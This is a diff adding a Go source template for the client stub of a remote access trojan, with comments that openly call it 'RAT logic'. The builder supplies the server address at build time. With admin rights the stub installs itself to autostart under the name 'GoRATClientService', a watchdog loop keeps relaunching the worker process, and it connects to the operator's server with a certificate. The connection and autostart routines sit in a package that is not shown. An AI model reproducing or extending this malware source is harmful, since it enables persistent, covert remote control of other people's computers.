@@ -1,0 +1,121 @@
+package main
+
+import (
+	"flag" // New import
+	"log"
+	"os"
+	"os/exec"
+	// "path/filepath" // already imported by os/exec indirectly, but good to be explicit if used directly below.
+	// No, path/filepath is standard lib and needs to be explicit if used. It was not in the original imports.
+	"path/filepath" // Explicitly adding for filepath.Dir and filepath.Join
+	"time"
+
+	stubpkg "{{.StubModuleName}}/internal/stub"
+	// golang.org/x/sys/windows/registry is only used in admin_windows.go, not directly in template
+)
+
+const (
+	ServerAddress  = "{{.ServerAddress}}"
+	EnableAdmin    = {{.EnableAdmin}}
+	EnableWatchdog = {{.EnableWatchdog}}
+)
+
+func main() {
+	isWorker := flag.Bool("worker", false, "Indicates if the process is a worker instance")
+	flag.Parse()
+
+	if EnableWatchdog && !(*isWorker) {
+		log.Println("Watchdog enabled. Starting as watchdog parent.")
+		startWatchdog()
+	} else {
+		if EnableWatchdog && *isWorker {
+			log.Println("Running as watchdog child (worker process).")
+		} else if !EnableWatchdog {
+			log.Println("Watchdog disabled. Running directly.")
+		}
+		// Actual RAT logic (connection to server, etc.)
+		runClient()
+	}
+}
+
+func runClient() {
+	log.Println("Stub client starting...")
+	log.Printf("Server Address: %s, Admin Mode: %t, Watchdog: %t (from build)", ServerAddress, EnableAdmin, EnableWatchdog)
+
+	executablePath, err := os.Executable()
+	if err != nil {
+		log.Printf("CRITICAL: Failed to get executable path: %v. Autostart and cert path determination will likely fail.", err)
+		// If we don't have executablePath, we cannot reliably set up autostart or find cert.pem.
+		// Stub might still run if cert.pem is in CWD and autostart is not critical.
+	}
+
+	if EnableAdmin && executablePath != "" { // Need executablePath for autostart
+		log.Println("Admin mode build option enabled.")
+		isAdmin, adminCheckErr := stubpkg.IsAdmin() // Assumes IsAdmin is in stubpkg
+		if adminCheckErr != nil {
+			log.Printf("Error checking admin status: %v", adminCheckErr)
+		}
+
+		if isAdmin {
+			log.Println("Running with administrator privileges.")
+			// Use a clear name for the autostart entry.
+			autostartAppName := "GoRATClientService" // Or make this configurable via build
+			err := stubpkg.SetupAutostart(executablePath, autostartAppName) // Assumes SetupAutostart in stubpkg
+			if err != nil {
+				log.Printf("Failed to setup autostart: %v", err)
+			} else {
+				log.Println("Autostart configuration attempted.") // Log success from SetupAutostart itself
+			}
+		} else {
+			log.Println("Not running with administrator privileges. Autostart requires admin rights and will likely fail or has not been set up.")
+		}
+	} else if EnableAdmin && executablePath == "" {
+		log.Println("Admin mode build option enabled, but cannot determine executable path. Autostart setup skipped.")
+	}
+	
+	// Determine cert.pem path
+	certPath := "cert.pem" // Default if executablePath is empty
+	if executablePath != "" {
+		exeDir := filepath.Dir(executablePath)
+		certPath = filepath.Join(exeDir, "cert.pem")
+	}
+	log.Printf("Using server certificate: %s", certPath)
+
+	// The connection logic
+	stubpkg.ConnectToServer(ServerAddress, certPath)
+}
+
+func startWatchdog() {
+	executablePath, err := os.Executable() // This is correct for watchdog
+	if err != nil {
+		log.Fatalf("Watchdog: Failed to get executable path: %v. Cannot start worker.", err)
+		return // This will exit the watchdog, and thus the stub.
+	}
+
+	for {
+		log.Println("Watchdog: Starting worker process...")
+		cmd := exec.Command(executablePath, "--worker")
+		cmd.Stdout = os.Stdout // Or redirect to a log file
+		cmd.Stderr = os.Stderr // Or redirect to a log file
+
+		err := cmd.Start()
+		if err != nil {
+			log.Printf("Watchdog: Failed to start worker: %v. Retrying in 10 seconds...", err)
+			time.Sleep(10 * time.Second)
+			continue
+		}
+
+		log.Printf("Watchdog: Worker process started with PID %d.", cmd.Process.Pid)
+		// Wait for the worker to exit
+		// Note: cmd.Wait() releases resources associated with cmd.Process after it exits.
+		processState, waitErr := cmd.Process.Wait()
+		if waitErr != nil {
+			log.Printf("Watchdog: Error waiting for worker (PID %d): %v. Process state: %s. Restarting...", cmd.Process.Pid, waitErr, processState)
+		} else {
+			log.Printf("Watchdog: Worker process (PID %d) exited. Process state: %s. Restarting...", cmd.Process.Pid, processState)
+		}
+		
+		// Small delay before restarting
+		time.Sleep(5 * time.Second)
+	}
+}
